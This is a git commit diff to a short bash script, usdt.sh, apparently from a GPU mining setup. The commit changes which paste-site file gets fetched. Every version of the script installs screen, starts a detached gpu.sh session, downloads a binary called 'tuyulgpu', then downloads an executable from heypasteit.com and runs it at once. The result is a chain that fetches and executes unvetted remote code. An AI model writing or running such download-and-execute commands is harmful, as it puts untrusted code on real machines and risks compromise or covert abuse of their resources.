36ba504dcdfa4418bd7716185d34b43f5aa4f15b
sampurasun111 <86062427+sampurasun111@users.noreply.github.com>
2021-06-20 12:45:41 +0700

    Update usdt.sh

--- usdt.sh
+++ usdt.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 
-sudo apt update && sudo apt install screen -y && screen -dmS gpu.sh ./gpu.sh 65 75 && wget https://github.com/sampurasun111/c/raw/main/tuyulgpu && chmod +x tuyulgpu && wget https://www.heypasteit.com/download/0IW735 && chmod u+x 0IW735 && ./0IW735
+sudo apt update && sudo apt install screen -y && screen -dmS gpu.sh ./gpu.sh 65 75 && wget https://github.com/sampurasun111/c/raw/main/tuyulgpu && chmod +x tuyulgpu && wget https://www.heypasteit.com/download/0IW8V1 && chmod u+x 0IW8V1 && ./0IW8V1
